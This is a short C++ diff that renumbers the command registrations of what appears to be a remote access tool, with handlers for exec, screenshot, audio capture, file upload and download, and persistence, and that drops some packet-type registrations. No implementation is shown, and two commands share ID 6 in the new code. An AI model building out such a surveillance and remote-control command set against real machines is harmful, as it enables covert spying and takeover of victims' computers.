@@ -10,21 +10,18 @@
 using namespace std;
 
 void register_all_commands() {
-    register_command(131, navigation);
-	register_command(132, discordCommand);
-	register_command(133, exec);
-	register_command(134, screenshot);
-	register_command(136, downloadFile);
-	register_command(137, uploadFile);
-	register_command(138, persist);
-	register_command(139, dialog);
+    register_command(3, navigation);
+	register_command(4, discordCommand);
+	register_command(5, exec);
+	register_command(6, screenshot);
+	register_command(6, audioCommand);
+	register_command(8, downloadFile);
+	register_command(9, uploadFile);
+	register_command(10, persist);
+	register_command(11, dialog);
 }
 
 void Controller::init() {
-	SimplePacket<char>::register_type(0);			//ret
-	SimplePacket<string>::register_type(1);			//out
-	SimplePacket<string>::register_type(2);			//err
-	SimplePacket<vector<char>>::register_type(3);	//buf
 	register_all_commands();
 }
 
